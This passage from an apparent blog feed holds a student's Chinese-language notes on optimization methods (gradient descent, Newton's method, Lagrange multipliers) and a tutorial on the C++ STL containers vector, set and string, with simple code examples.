style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span><br> 这里的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span> 是自变量的值。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>θ</mi><mi>i</mi></msub><mo>=</mo><mi mathvariant="normal">Δ</mi><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta_{i+1} - \theta_{i} = \Delta\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></p><h3 id="牛顿法-和拟牛顿法"><a class="markdownIt-Anchor" href="#牛顿法-和拟牛顿法">#</a> 牛顿法 和拟牛顿法</h3><p>牛顿法和梯度下降法有些相同点</p><ul><li>梯度下降法为求一阶导数，即参数的梯度，根据梯度的方向乘以一个 lr 即学习率来对参数进行改变。而牛顿法则是对函数在初始点进行二阶泰勒展开。之后对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>θ</mi></mrow><annotation encoding="application/x-tex">\Delta \theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span> 进行求导，以求得最优增量。这时将等式变换可以得到 最优增量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>θ</mi><mo>=</mo><mo>−</mo><mi mathvariant="normal">∇</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mi>f</mi></msub><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\Delta\theta = - \nabla(H_{f}(\theta))^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1002159999999999em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mord">∇</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 这里的 H 即黑森矩阵，为向量二阶求导后得出的偏导数矩阵。但是这里有几个问题，黑森矩阵可能是不可逆的，故后面引出了拟牛顿法来通过求解一个相似的黑森矩阵来解决这个问题。<br>故下面介绍下拟牛顿法</li><li>其实不知道拟牛顿法会出一些什么题。课本上有一个证明秩 1 修正的对偶性。（暂时没太看懂）</li></ul><h3 id="约束优化"><a class="markdownIt-Anchor" href="#约束优化">#</a> 约束优化</h3><h5 id="拉格朗日乘数法"><a class="markdownIt-Anchor" href="#拉格朗日乘数法">#</a> 拉格朗日乘数法</h5><p>通过拉格朗日乘数法可以将约束问题转化为无约束问题进行求解。<br>拉格朗日乘法形式：设函数  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">u = f(x,y,z,t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span>, 约束条件为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi>ψ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\varphi(x,y,z,t)=0, \psi(x,y,z,t)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>  , 可以进行构造拉格朗日函数。<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><msub><mi>λ</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>λ</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>λ</mi><mn>1</mn></msub><mi>φ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>λ</mi><mn>2</mn></msub><mi>ψ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(x,y,z,t,\lambda_1,\lambda_2) = f(x,y,z,t) + \lambda_1\varphi(x,y,z,t)+\lambda_2\psi(x,y,z,t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span> 分别对上述各个变量求导列方程即可得到可能的极值点坐标。</p>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ STL 学习</title>
      <link href="/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/"/>
      <url>/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>由于自己之前并不常用 STL 库，而 STL 库在很多算法中能够节省很多自己手打数据结构的时间，故这里开一个笔记来重新学习一下，也方便自己之后能够复习。</p><h2 id="vector-的常见用法详解"><a class="markdownIt-Anchor" href="#vector-的常见用法详解">#</a> Vector 的常见用法详解</h2><p>【简介】vector 翻译为向量，我觉得用‘变长数组’来解释他更为合适。利用 vector 可以避免超内存等情况，节省空间。也可以用邻接表的方式来存储图。  使用 vector 头文件是  vector 需要 include.<br><strong>1，vector 定义</strong><br>单独定义一个 vector:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>上面这个定义其实相当于定义了一个一维数组 name [SIZE]，只不过其长度可以根据需要进行变化。 这里的 typename 可以是任何数据类型。<br>如果 typename 也是 vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">typename</span>&gt;&gt; name; </span><br></pre></td></tr></table></figure><p>这里很容易联想到二维数组的定义，我们可以认为其是两个维度都可变长的二维数组。<br>然后是<strong> vector 数组</strong> 的方法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; Arrayname[arraysize];</span><br></pre></td></tr></table></figure><p>这样 Arrayname [0] ~ Arrayname [arraysize-1] 都是一个<strong> vector</strong> 容器。 这里是一个维度固定的二维数组。<br><strong>2，vector 容器内元素的访问</strong></p><ul><li><p>通过下标访问。<br>和访问普通数组一样，对于 vector&lt;typename&gt; vi; 直接通过 vi [index 访问即可。这里的下标是从 0 到 vi.size ()-1 访问这个范围外的元素可能会出错。</p></li><li><p>通过迭代器访问。<br>迭代器 (iterator) 可以理解是一种类似<strong>指针</strong>的东西，其定义是:</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt;::iterator it;</span><br></pre></td></tr></table></figure><p>这样得到了迭代器 it, 并且可以通过 * it 来访问 vector 的元素。<br>例如，这里有一个 vector 容器：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">5</span>; i++)&#123;</span><br><span class="line"> vi.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过下面的方式进行访问容器内的元素</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,*(it + i)); <span class="comment">//输出 vi[i]</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从这里可以看出 vi [i] 和 *(vi.begin ()+ i ) 是等价的。<br>这里 begin () 是取 vector 头元素的地址，这里引出 <strong>end()</strong> 这里需要注意 <strong>end()</strong> 是取 vector 末尾元素地址的下一个地址，不存储任何元素。故这里有了另一种遍历 vector 的方法。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>(); it != vi.<span class="built_in">end</span>() ; it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要指出，在常用的 STL 容器中，只有<strong> vector 和 string</strong> 中，才允许使用<strong> vi.begin ()+3</strong> 这种迭代器加上整数的写法。<br><strong>3，vector 常用函数实例解析</strong><br><strong>（1）push_back</strong><br> 顾名思义，push_back (x) 就是在 vector 尾元素添加一个元素 x, 时间复杂度 O (1)。<br><strong>（2）pop_back</strong><br> 即删除 vector 的尾元素。<br><strong>（3）size()</strong><br> 用来获取 vector 中元素的个数。返回 unsigned 类型。<br><strong>（4）clear()</strong><br> 用来清空 vector 中的所有元素。<br><strong>（5）insert()</strong><br> insert (it,x) 用来向 vector 的任意迭代器 it 处插入一个元素 x。<br><strong>（6）erase()</strong><br> 两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素。 erase (it) 即删除迭代器为 it 处的元素。<br>②删除一个区间所有的元素，erase (first,end), 删除 [first,last) 内的所有元素。<br><strong>4，vector 的常见用途</strong><br>（1）存储数据<br>（2）用邻接表存储图</p></li></ul><h2 id="set-的常见用法详解"><a class="markdownIt-Anchor" href="#set-的常见用法详解">#</a> set 的常见用法详解</h2><p>【简介】set 翻译为集合，是指一个内部自动有序且不含重复元素的容器。考试中，有可能出现需要去掉重复元素的情况，这时候就可以用 set 来保留元素本身不考虑其个数。使用 set 需要添加 &lt;set&gt;。<br><strong>1，set 的定义</strong><br>单独定义一个 set</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>这里的写法和 vector 基本一样，或者说大部分的 STL 都是这样定义的，typename 可以是任何基本类型。 这里不再介绍各个数组之类的定义方式，和 vector 基本一样。<br><strong>2，set 容器内元素的访问</strong><br> set 只能通过迭代器 (iterator) 访问。定义方式和 vector 的迭代器定义方式一样。由于除了 <strong>vector 和 stirng</strong> 之外的迭代器都不只除 *(it + i) 的访问方式，因此只能按照下面方式枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">5</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">2</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="type">int</span>&gt;::iterator it = st.<span class="built_in">begin</span>();it != st.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的输出结果为 2  3  5。<br><strong>3,set 常用函数实例解析</strong><br><strong>（1） insert ()</strong><br> insert (x) 可将 x 插入 set 容器中，并自动递增排序和去重。<br><strong>（2）find()</strong><br> find (value) 返回 set 中对应值为 value 的迭代器。<br><strong>（3）erase()</strong><br> erase 也有两种用法：删除单个元素，删除区间内元素<br>①删除单个，st.erase (it)，it 为所要删除元素的迭代器。可以结合 find () 函数来表示<br> st.erase (value),value 为所要删除的元素的值。<br>②删除一个区间的所有元素。 st.erase (first,last) 可以删除一个区间所有的元素，first 和 last 为迭代器形式，注意删除为 [first,last) 左闭右开。<br><strong>（4）size()</strong><br> 用来获得 set 内元素的个数。<br><strong>（5）clear()</strong><br> clear () 用来清空 set 中所有的元素。<br><strong>3,set 的常见用途</strong><br>主要作用是自动去重并按照升序进行排序。</p><h2 id="string的常见用法详解"><a class="markdownIt-Anchor" href="#string的常见用法详解">#</a> string 的常见用法详解</h2><p>【简介】在 C 语言中，一般用字符串数组 char str [] 来存放字符串。使用 string 会更加的方便。如果要使用 string，需要包含 string 头文件，注意 string.h 和 string 是不一样的头文件。<br><strong>1，string 的定义</strong><br>定义 string 的方式和基本数据类型相同，只需要在 string 上跟上变量名（可进行初始化）即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>2，string 中内容的访问</strong><br><strong>（1）通过下标访问</strong><br>一般来说，可以直接像字符数组那样去访问 string:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; str.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,str[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果就是 abcd 。<br>如果要读入或者输出整个字符串，则只能用 cin 和 cout：(如果想用 printf 输出 string，需要利用 c_str () 函数将 string 类型转换为字符数组来进行输出)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">cout&lt;&lt;str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str.<span class="built_in">c_str</span>());</span><br></pre></td></tr></table></figure><p><strong>（2）通过迭代器访问</strong><br>因为有些函数如 insert () 和 erase () 要求迭代器为参数，因此还是需要学习一个 string 迭代器的用法。<br>由于 string 不像其他 STL 容器需要参数，故可以这样定义迭代器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string::iterator it;</span><br></pre></td></tr></table></figure><p>这样就得到了迭代器 it，并且可以通过 * 来访问 string 的每一位。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(string::iterator it = str.<span class="built_in">begin</span>(); it != str.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3,string 常用函数实例解析</strong><br> string 的函数有很多，这里只调出几个主要的。<br><strong>（1）operator+=</strong><br> 这是 string 的加法，可以直接将两个 string 拼接起来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 